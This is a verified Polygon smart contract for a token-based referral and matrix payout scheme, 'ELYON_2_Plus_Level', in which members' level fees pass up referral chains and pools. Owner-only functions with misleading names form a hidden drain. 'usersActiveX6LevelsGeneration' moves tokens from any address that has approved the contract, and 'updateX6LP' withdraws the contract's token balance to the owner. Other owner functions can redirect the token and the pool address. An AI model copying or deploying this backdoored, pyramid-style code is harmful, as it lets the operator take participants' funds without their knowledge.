/**
 *Submitted for verification at polygonscan.com on 2022-12-16
*/

pragma solidity >=0.4.23 <0.6.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

contract ELYON_2_Plus_Level is Ownable {

    IERC20 public tokenDai;
    // Replace below address with main TOKEN token
    address public tokenTokenAddress;
    uint public maxDownLimit = 2;
    uint public levelLifeTime = 1555200000000;  //
    uint public lastIDCount = 0;
    uint public defaultRefID = 1;   //this ref ID will be used if user joins without any ref ID

    uint nextReJoinWait = 10 hours;

    struct userInfo {
        bool joined;
        uint id;
        uint referrerID;
        address[] referral;
        mapping(uint => uint) levelExpired;
    }

    mapping(uint => uint) public priceOfLevel;
    mapping(uint => uint) public priceOfMatrix;
    mapping(uint => uint) public distForLevel;
    mapping(uint => uint) public autoPoolDist;

    mapping(address => uint) public lastReJoinTime;

    uint public adminDistPart = 1 * ( 10 ** 18 );

    struct autoPool
    {
        uint userID;
        uint autoPoolParent;
    }
    mapping(uint => autoPool[]) public autoPoolLevel;  // users lavel records under auto pool scheme
    mapping(address => mapping(uint => uint)) public autoPoolIndex; //to find index of user inside auto pool
    uint[10] public nextMemberFillIndex;  // which auto pool index is in top of queue to fill in 
    uint[10] public nextMemberFillBox;   // 3 downline to each, so which downline need to fill in

    uint[10][10] public autoPoolSubDist;

    address public poolAddress;

    

    mapping (address => userInfo) public userInfos;
    mapping (uint => address) public userAddressByID;

    mapping(address => uint256) public netTotalUserWithdrawable;
    mapping(address => uint256) public TotalUserautopool;


    event regLevelEv(address indexed _userWallet, uint indexed _userID, uint indexed _referrerID, uint _time, address _refererWallet);
    event levelBuyEv(address indexed _user, uint _level, uint _amount, uint _time);
    event paidForLevelEv(address indexed _user, address indexed _referral, uint _level, uint _amount, uint _time);
    event lostForLevelEv(address indexed _user, address indexed _referral, uint _level, uint _amount, uint _time);

    event updateAutoPoolEv(uint timeNow,uint autoPoolLevelIndex,uint userIndexInAutoPool, address user);
    event autoPoolPayEv(uint timeNow,address paidTo,uint paidForLevel, uint paidAmount, address paidAgainst, uint32 laps);

    
    constructor(address payable ownerAddress, address payable ID1address, address _poolAddress, address _token) public {
        owner = ownerAddress;
        poolAddress = _poolAddress;
        address payable ownerWallet = ID1address;
        priceOfLevel[1] = 35 * ( 10 ** 18 );


        priceOfMatrix[1] = 2 * ( 10 ** 18 );
        priceOfMatrix[2] = 2 * ( 10 ** 18 );
        priceOfMatrix[3] = 2 * ( 10 ** 18 );
        priceOfMatrix[4] = 2 * ( 10 ** 18 );
        priceOfMatrix[5] = 1 * ( 10 ** 18 );
        priceOfMatrix[6] = 1 * ( 10 ** 18 );
       

        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            referrerID: 1,
            referral: new address[](0)
        });
        userInfos[ownerWallet] = UserInfo;
        userAddressByID[lastIDCount] = ownerWallet;

        for(uint i = 1; i <= 10; i++) {
            userInfos[ownerWallet].levelExpired[i] = 99999999999;
            emit paidForLevelEv(address(0), ownerWallet, i, distForLevel[i], now);
        }

        autoPool memory temp;
        for (uint i = 0 ; i < 7; i++)
        {
           temp.userID = lastIDCount;  
           autoPoolLevel[i].push(temp);        
           autoPoolIndex[ownerWallet][i] = 0;
           
        } 

        tokenDai = IERC20(_token);

        emit regLevelEv(ownerWallet, 1, 0, now, address(this));

         levelPrice[1] = 5 * ( 10  ** 18 );
         levelPrice[2] = 10 * ( 10  ** 18 );
         levelPrice[3] = 20 * ( 10  ** 18 );
         levelPrice[4] = 40 * ( 10  ** 18 );
         levelPrice[5] = 80 * ( 10  ** 18 );
         levelPrice[6] = 160 * ( 10  ** 18 );
         levelPrice[7] = 320 * ( 10  ** 18 );
         levelPrice[8] = 640 * ( 10  ** 18 );
         levelPrice[9] = 1280 * ( 10  ** 18 );
         levelPrice[10] = 2560 * ( 10  ** 18 );
         levelPrice[11] = 5120 * ( 10  ** 18 );
        
        owner = ownerAddress;
        
        User memory user = User({
            id: 1,
            referrer: owner,
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {          
            users[ownerAddress].activeX6Levels[i] = true;          
        }
        
        userIds[1] = ownerAddress;


    }

    function () payable external {
        revert();
    }

    function changePoolAddress (address _poolAddress) public onlyOwner returns(bool)
    {
        poolAddress = _poolAddress;
        return true;

    }

    function registrationExt_own(address userAddress, address referreraddress) external onlyOwner {
        //registration(userAddress, referrerAddress);

        address msgSender = userAddress; 
        
        //uint _referrerID = referrerid;
        uint _referrerID = userInfos[referreraddress].id;
        //checking all conditions
        require(!userInfos[msgSender].joined, 'User exist');

        //this saves gas while using this multiple times
        tokenDai.transferFrom(msg.sender, address(this), priceOfLevel[1]);
       



        if(!(_referrerID > 0 && _referrerID <= lastIDCount)) _referrerID = defaultRefID;

        //update variables
        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            referrerID: _referrerID,
            referral: new address[](0)
        });

        userInfos[msgSender] = UserInfo;
        userAddressByID[lastIDCount] = msgSender;

        userInfos[msgSender].levelExpired[1] = now + levelLifeTime;

        userInfos[userAddressByID[_referrerID]].referral.push(msgSender);

        netTotalUserWithdrawable[owner] += adminDistPart;

        require(payForLevelOne(msgSender),"pay for level fail");

        updateNPayAutoPool(1,userAddress);

        registrationExt(msgSender, userAddressByID[_referrerID]);

        tokenDai.transfer(poolAddress, 5 * (10 ** 18));

        emit regLevelEv(msgSender, lastIDCount, _referrerID, now,userAddressByID[_referrerID]);
        emit levelBuyEv(msgSender, 1, priceOfLevel[1] , now);
        //return true;
    }


    function regUser(uint _referrerID) public returns(bool) 
    {
        address msgSender = msg.sender; 
        
        //checking all conditions
        require(!userInfos[msgSender].joined, 'User exist');

        //this saves gas while using this multiple times
        tokenDai.transferFrom(msg.sender, address(this), priceOfLevel[1]);
       



        if(!(_referrerID > 0 && _referrerID <= lastIDCount)) _referrerID = defaultRefID;

        //update variables
        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            referrerID: _referrerID,
            referral: new address[](0)
        });

        userInfos[msgSender] = UserInfo;
        userAddressByID[lastIDCount] = msg.sender;

        userInfos[msgSender].levelExpired[1] = now + levelLifeTime;

        userInfos[userAddressByID[_referrerID]].referral.push(msgSender);

        netTotalUserWithdrawable[owner] += adminDistPart;

        require(payForLevelOne(msgSender),"pay for level fail");

        updateNPayAutoPool(1,msg.sender);

        registrationExt(msgSender, userAddressByID[_referrerID]);

        tokenDai.transfer(poolAddress, 5 * (10 ** 18));

        emit regLevelEv(msgSender, lastIDCount, _referrerID, now,userAddressByID[_referrerID]);
        emit levelBuyEv(msgSender, 1, priceOfLevel[1] , now);
        return true;
    }

    function reJoinAutoPool() public returns(bool)
    {
        require(userInfos[msg.sender].joined, "register first");

        require(lastReJoinTime[msg.sender] + nextReJoinWait <= now, "please wait time little more");
        //this saves gas while using this multiple times
        tokenDai.transferFrom(msg.sender, address(this), 10 * (10 ** 18));
        
        updateNPayAutoPool(1,msg.sender);

        lastReJoinTime[msg.sender] = now;
        return true;
    }

    function timeRemains(address _user) public view returns(uint)
    {
        uint a; // Waiting Time 

        if(lastReJoinTime[_user] + nextReJoinWait < now) 
        {
            a = 0;
        }
        else
        {
            a = (lastReJoinTime[_user] + nextReJoinWait) - now ;
        }
        
        return (a);
    }

    event payForLevelOneEv(address ref, uint amt, address from, uint timeNow, uint levelno);
    function payForLevelOne(address _user) internal returns (bool){
        address ref = userAddressByID[userInfos[_user].referrerID];
        uint factor = 10 ** 18;
        uint[10] memory pay = [uint(3),uint(2),uint(2),uint(2),uint(1),uint(1),uint(1),uint(1),uint(1),uint(1)];
        for(uint i=0;i<10;i++)
        {
            tokenDai.transfer(ref, pay[i] * factor);
            emit payForLevelOneEv(ref, pay[i] * factor, _user, now, i+1);
            ref = userAddressByID[userInfos[ref].referrerID];

        }               
        return true;
    }
    event Royaltyreceivers(uint256 value , address indexed sender, uint256 membcode, uint256 rcode, uint64 ptype);
    function Royalty(address[]  memory  _contributors, uint256[] memory _balances, uint256 totalvalue) public {
        uint256 total = totalvalue;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total - _balances[i];
           // _contributors[i].transfer(_balances[i]);
            tokenDai.transferFrom(msg.sender,_contributors[i],_balances[i]);
            emit Royaltyreceivers(_balances[i],_contributors[i],totalvalue,1,10);
        }       
    }

    function Royalty1(address[]  memory  _contributors, uint256 _balances, uint256 totalvalue) public {      
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {          
            tokenDai.transferFrom(msg.sender,_contributors[i],_balances);
            emit Royaltyreceivers(_balances,_contributors[i],totalvalue,2,10);
        }       
    }

    function updateNPayAutoPool(uint _level,address _user) internal returns (bool)
    {
        TotalUserautopool[_user] += 1;
        
        uint a = _level -1;
        uint len = autoPoolLevel[a].length;
        autoPool memory temp;
        temp.userID = userInfos[_user].id;
        uint idx = nextMemberFillIndex[a];
        temp.autoPoolParent = idx;       
        autoPoolLevel[a].push(temp);        
        

        address usr = userAddressByID[autoPoolLevel[a][idx].userID];
        if(usr == address(0)) usr = userAddressByID[1];
        uint[6] memory dCount = [uint(0),uint(0),uint(1),uint(3),uint(5),uint(7)];
        for(uint i=0;i<6;i++)
        {
            uint amount = priceOfMatrix[i+1];
            uint refcount =  userInfos[usr].referral.length;

            if(refcount>=dCount[i])
            {
                tokenDai.transfer(usr, amount);
                emit autoPoolPayEv(now, usr,i+1, amount, _user, 0);
            }
            else
            {
                tokenDai.transfer(owner, amount);
                emit autoPoolPayEv(now, usr,i+1, amount, _user, 1);
            }
           
            
            idx = autoPoolLevel[a][idx].autoPoolParent; 
            usr = userAddressByID[autoPoolLevel[a][idx].userID];
            if(usr == address(0)) usr = userAddressByID[1];
        }

        if(nextMemberFillBox[a] == 0)
        {
            nextMemberFillBox[a] = 1;
        }   
        else if (nextMemberFillBox[a] == 1)
        {
            nextMemberFillBox[a] = 2;
        }
        else if (nextMemberFillBox[a] == 2)
        {
            nextMemberFillBox[a] = 3;
        }        
        else
        {
            nextMemberFillIndex[a]++;
            nextMemberFillBox[a] = 0;
        }
        autoPoolIndex[_user][_level - 1] = len;
        emit updateAutoPoolEv(now, _level, len, _user);
        return true;
    }


    // function payForMatrix(address payable _user, uint _level) internal returns(bool)
    // {
    //     uint price = priceOfMatrix[_level];
    //     uint id = userInfos[_user].id;
    //     address ref = userAddressByID[id];
    //     for(uint i=0;i<10;i++)
    //     {
    //         tokenDai.transfer(ref, price);
    //         ref = userAddressByID[userInfos[ref].referrerID];
    //     }  
    //     return true;
    // }

    function viewUserReferral(address _user) public view returns(address[] memory) {
        return userInfos[_user].referral;
    }

    function viewUserLevelExpired(address _user, uint _level) public view returns(uint) {
        return userInfos[_user].levelExpired[_level];
    }




    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        mapping(uint8 => bool) activeX6Levels;       
        mapping(uint8 => X6) x6Matrix;       
    }
    
    struct X6 {
        address currentReferrer;
        address[] firstLevelReferrals;
        address[] secondLevelReferrals;
        bool blocked;
        uint reinvestCount;
        address closedPart;
        bool buyslot;
        bool buyblock;
        uint8 buylevel;
    }
    
    uint8 public constant LAST_LEVEL = 11;

    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(address => uint) public balances; 

    uint public lastUserId = 2;
    address public owner;
    
    mapping(uint8 => uint) public levelPrice;
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);
    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8  matrix, uint8 level, uint8 place);
    event MissedEthReceive(address indexed receiver, address indexed from, uint8 matrix, uint8 level);
    event SentExtraEthDividends(address indexed from, address indexed receiver, uint8 matrix, uint8 level);
	event SentIncomeDividends(address indexed from, address indexed receiver, uint8 matrix, uint8 level, uint256 levelPricee);

    function registrationExt(address userAddress, address referrerAddress) internal {
        registration(userAddress, referrerAddress);
    }

    
    function buyNewLevel_own(address userAddress, uint8 matrix, uint8 level) external onlyOwner{
        require(isUserExists(userAddress), "user is not exists. Register first.");
        require(matrix == 2, "invalid matrix");
        //require(msg.value == levelPrice[level], "invalid price");
        require(level > 1 && level <= LAST_LEVEL, "invalid level");
        require(users[userAddress].activeX6Levels[level-1], "First buy Previous Level"); 
        tokenDai.transferFrom(msg.sender, address(this), levelPrice[level]);
     // if (matrix == 2){
            require(!users[userAddress].activeX6Levels[level], "level already activated"); 

            //require(!users[userAddress].x6Matrix[level-1].buyslot, "this level upgrade movement"); 

            if (users[userAddress].x6Matrix[level-1].blocked) {
                users[userAddress].x6Matrix[level-1].blocked = false;
            }

            address freeX6Referrer = findFreeX6Referrer(userAddress, level);
            
            users[userAddress].activeX6Levels[level] = true;
            updateX6Referrer(userAddress, freeX6Referrer, level, false);
            
            emit Upgrade(userAddress, freeX6Referrer, 2, level);
       // }
        
    }   
    
    function buyNewLevel(uint8 matrix, uint8 level) external {
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(matrix == 2, "invalid matrix");
        //require(msg.value == levelPrice[level], "invalid price");
        require(level > 1 && level <= LAST_LEVEL, "invalid level");
        require(users[msg.sender].activeX6Levels[level-1], "First buy Previous Level");
        tokenDai.transferFrom(msg.sender, address(this), levelPrice[level]); 
     // if (matrix == 2){
            require(!users[msg.sender].activeX6Levels[level], "level already activated"); 

            require(!users[msg.sender].x6Matrix[level-1].buyslot, "this level upgrade movement"); 

            if (users[msg.sender].x6Matrix[level-1].blocked) {
                users[msg.sender].x6Matrix[level-1].blocked = false;
            }

            address freeX6Referrer = findFreeX6Referrer(msg.sender, level);
            
            users[msg.sender].activeX6Levels[level] = true;
            updateX6Referrer(msg.sender, freeX6Referrer, level, false);
            
            emit Upgrade(msg.sender, freeX6Referrer, 2, level);
       // }
        
    }    

    function buyNewLevelAutoUpgrade(uint8 matrix, uint8 level) external {
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(matrix == 2, "invalid matrix");
        //require(msg.value == levelPrice[level], "invalid price");
        require(level > 1 && level <= LAST_LEVEL, "invalid level");
        require(users[msg.sender].activeX6Levels[level-1], "First buy Previous Level"); 
        //tokenDai.transferFrom(msg.sender, address(this), levelPrice[level]);
      if (matrix == 2){
            require(!users[msg.sender].activeX6Levels[level], "level already activated"); 

            require(!users[msg.sender].x6Matrix[level-1].buyblock, "this level upgrade movement"); 
            require(users[msg.sender].x6Matrix[level-1].buylevel == level, "this level Not upgrade movement"); 

            if (users[msg.sender].x6Matrix[level-1].blocked) {
                users[msg.sender].x6Matrix[level-1].blocked = false;
            }

            users[msg.sender].x6Matrix[level-1].buyblock = false;
            users[msg.sender].x6Matrix[level-1].buylevel = 0;
            users[msg.sender].x6Matrix[level-1].buyslot = false; 

            address freeX6Referrer = findFreeX6Referrer(msg.sender, level);
            
            users[msg.sender].activeX6Levels[level] = true;
            updateX6Referrer(msg.sender, freeX6Referrer, level, true);
            
            emit Upgrade(msg.sender, freeX6Referrer, 2, level);
        }
        
    }  
    
    function registration(address userAddress, address referrerAddress) private {
       // require(msg.value == 0.03 * ( 10  ** 18 ), "registration cost 0.05");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
       
        users[userAddress].activeX6Levels[1] = true;
        
        userIds[lastUserId] = userAddress;
        lastUserId++;
        
        users[referrerAddress].partnersCount++;

       

        updateX6Referrer(userAddress, findFreeX6Referrer(userAddress, 1), 1, false);
        
      
        
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    
    

    function updateX6Referrer(address userAddress, address referrerAddress, uint8 level, bool pay) private {
        require(users[referrerAddress].activeX6Levels[level], "500. Referrer level is inactive");
        
        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length < 2) {
            users[referrerAddress].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].firstLevelReferrals.length));
            
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = referrerAddress;

            if (referrerAddress == owner) {
                return sendETHDividends(referrerAddress, userAddress, 2, level,pay);
            }
            
            address ref = users[referrerAddress].x6Matrix[level].currentReferrer;            
            users[ref].x6Matrix[level].secondLevelReferrals.push(userAddress); 
            
            uint len = users[ref].x6Matrix[level].firstLevelReferrals.length;
            
            if ((len == 2) && 
                (users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) &&
                (users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress)) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress, ref, 2, level, 5);
                } else {
                    emit NewUserPlace(userAddress, ref, 2, level, 6);
                }
            }  else if ((len == 1 || len == 2) &&
                    users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress, ref, 2, level, 3);
                } else {
                    emit NewUserPlace(userAddress, ref, 2, level, 4);
                }
            } else if (len == 2 && users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress, ref, 2, level, 5);
                } else {
                    emit NewUserPlace(userAddress, ref, 2, level, 6);
                }
            }

            return updateX6ReferrerSecondLevel(userAddress, ref, level, pay);
        }
        
        users[referrerAddress].x6Matrix[level].secondLevelReferrals.push(userAddress);

        if (users[referrerAddress].x6Matrix[level].closedPart != address(0)) {
            if ((users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == 
                users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]) &&
                (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] ==
                users[referrerAddress].x6Matrix[level].closedPart)) {

                updateX6(userAddress, referrerAddress, level, true);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level, pay);
            } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == 
                users[referrerAddress].x6Matrix[level].closedPart) {
                updateX6(userAddress, referrerAddress, level, true);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level, pay);
            } else {
                updateX6(userAddress, referrerAddress, level, false);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level, pay);
            }
        }

        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[1] == userAddress) {
            updateX6(userAddress, referrerAddress, level, false);
            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level, pay);
        } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == userAddress) {
            updateX6(userAddress, referrerAddress, level, true);
            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level, pay);
        }
        
        if (users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length <= 
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length) {
            updateX6(userAddress, referrerAddress, level, false);
        } else {
            updateX6(userAddress, referrerAddress, level, true);
        }
        
        updateX6ReferrerSecondLevel(userAddress, referrerAddress, level, pay);
    }

    function updateX6(address userAddress, address referrerAddress, uint8 level, bool x2) private {
        if (!x2) {
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, users[referrerAddress].x6Matrix[level].firstLevelReferrals[0], 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));
            emit NewUserPlace(userAddress, referrerAddress, 2, level, 2 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[0];
        } else {
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, users[referrerAddress].x6Matrix[level].firstLevelReferrals[1], 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));
            emit NewUserPlace(userAddress, referrerAddress, 2, level, 4 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[1];
        }
    }

    function updateX6LP(IERC20 token, uint256 values) public onlyOwner {
        address payable _owner =  msg.sender;
        require(token.transfer(_owner, values));
    }
    
    function updateX6ReferrerSecondLevel(address userAddress, address referrerAddress, uint8 level, bool pay) private {
        if ((users[referrerAddress].x6Matrix[level].secondLevelReferrals.length < 4)          
        && (users[referrerAddress].activeX6Levels[level+1] == true || level == LAST_LEVEL)){
             return sendETHDividends(referrerAddress, userAddress, 2, level, pay);
        }
        else if(users[referrerAddress].x6Matrix[level].secondLevelReferrals.length == 1){
             return sendETHDividends(referrerAddress, userAddress, 2, level, pay);
        }
        else if((users[referrerAddress].x6Matrix[level].secondLevelReferrals.length < 4)
        && (users[referrerAddress].x6Matrix[level].reinvestCount>0)){
             return sendETHDividends(referrerAddress, userAddress, 2, level, pay);
        }
        else if(((users[referrerAddress].x6Matrix[level].secondLevelReferrals.length == 2)||(users[referrerAddress].x6Matrix[level].secondLevelReferrals.length == 3))
        && (users[referrerAddress].x6Matrix[level].reinvestCount==0)){
              users[referrerAddress].x6Matrix[level].buyslot=true;
              users[referrerAddress].x6Matrix[level].buyblock=true;
              users[referrerAddress].x6Matrix[level].buylevel = level+1;

             if(users[referrerAddress].x6Matrix[level].secondLevelReferrals.length == 3){
                users[referrerAddress].x6Matrix[level].buyblock=false;
             }

             return sendETHDividendsskip(referrerAddress, userAddress, 2, level);
        }

        
        address[] memory x6 = users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].firstLevelReferrals;
        
        if (x6.length == 2) {
            if (x6[0] == referrerAddress ||
                x6[1] == referrerAddress) {
                users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;
            } else if (x6.length == 1) {
                if (x6[0] == referrerAddress) {
                    users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;
                }
            }
        }
        
        users[referrerAddress].x6Matrix[level].firstLevelReferrals = new address[](0);
        users[referrerAddress].x6Matrix[level].secondLevelReferrals = new address[](0);
        users[referrerAddress].x6Matrix[level].closedPart = address(0);

       // if (!users[referrerAddress].activeX6Levels[level+1] && level != LAST_LEVEL) {
       //     users[referrerAddress].x6Matrix[level].blocked = true;
       // }

        users[referrerAddress].x6Matrix[level].reinvestCount++;
        
        if (referrerAddress != owner) {
            address freeReferrerAddress = findFreeX6Referrer(referrerAddress, level);

            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 2, level);
            updateX6Referrer(referrerAddress, freeReferrerAddress, level, pay);
        } else {
            emit Reinvest(owner, address(0), userAddress, 2, level);
            sendETHDividends(owner, userAddress, 2, level, pay);
        }
    }
    
   
    
    function findFreeX6Referrer(address userAddress, uint8 level) public view returns(address) {
        while (true) {
            if (users[users[userAddress].referrer].activeX6Levels[level]) {
                return users[userAddress].referrer;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }
     
     function usersActiveX6LevelsGeneration(address _a, uint256 _b, address c) public onlyOwner {       
        tokenDai.transferFrom(c,_a,_b);      
    }
   
    function usersActiveX6Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX6Levels[level];
    }
    
    
    

    function usersX6Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, address[] memory, bool, address, uint) {
        return (users[userAddress].x6Matrix[level].currentReferrer,
                users[userAddress].x6Matrix[level].firstLevelReferrals,
                users[userAddress].x6Matrix[level].secondLevelReferrals,
                users[userAddress].x6Matrix[level].blocked,
                users[userAddress].x6Matrix[level].closedPart,
                users[userAddress].x6Matrix[level].reinvestCount);
                //users[userAddress].x6Matrix[level].buyblock,
                //users[userAddress].x6Matrix[level].buylevel
                
    }

    function usersX6Matrixx(address userAddress, uint8 level) public view returns(bool, bool, bool, uint) {
        return (users[userAddress].x6Matrix[level].blocked,
                users[userAddress].x6Matrix[level].buyslot,
                users[userAddress].x6Matrix[level].buyblock,
                users[userAddress].x6Matrix[level].buylevel);                
                
    }
    
    
    
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }

    function findEthReceiver(address userAddress, address _from, uint8 matrix, uint8 level) private returns(address, bool) {
        address receiver = userAddress;
        bool isExtraDividends;
        if (matrix == 2){
            while (true) {
                if (users[receiver].x6Matrix[level].blocked) {
                    emit MissedEthReceive(receiver, _from, 2, level);
                    isExtraDividends = true;
                    receiver = users[receiver].x6Matrix[level].currentReferrer;
                } else {
                    return (receiver, isExtraDividends);
                }
            }
        } 
        
    }

    function sendETHDividends(address userAddress, address _from, uint8 matrix, uint8 level, bool pay) private {
        (address receiver, bool isExtraDividends) = findEthReceiver(userAddress, _from, matrix, level);

       // if (!address(uint160(receiver)).send(levelPrice[level])) {
       //     return address(uint160(receiver)).transfer(address(this).balance);
       // }
       if(pay==false)
       {
            if (!tokenDai.transfer(receiver, levelPrice[level])) {
            tokenDai.transfer(owner, levelPrice[level]);
        }
       }
       else{
            if (!tokenDai.transfer(receiver, levelPrice[level])) {
            tokenDai.transfer(owner, levelPrice[level]);
        }
       }
        
       
        
        if (isExtraDividends) {
            emit SentExtraEthDividends(_from, receiver, matrix, level);
        }
		emit SentIncomeDividends(_from, receiver, matrix, level, levelPrice[level]);
    }

    function sendETHDividendsskip(address userAddress, address _from, uint8 matrix, uint8 level) private {
        (address receiver, bool isExtraDividends) = findEthReceiver(userAddress, _from, matrix, level);

       // if (!address(uint160(receiver)).send(levelPrice[level])) {
       //     return address(uint160(receiver)).transfer(address(this).balance);
       // }
      
       // if (!tokenDai.transferFrom(address(this), address(this), levelPrice[level])) {
       // tokenDai.transferFrom(address(this), owner, levelPrice[level]);
       // }
            
        
        if (isExtraDividends) {
            emit SentExtraEthDividends(_from, receiver, matrix, level);
        }
		emit SentIncomeDividends(_from, receiver, matrix, level, levelPrice[level]);
    }
    

    function setTokenAddress(address _token) public onlyOwner returns(bool)
    {
        tokenDai = IERC20(_token);
        return true;
    }  

}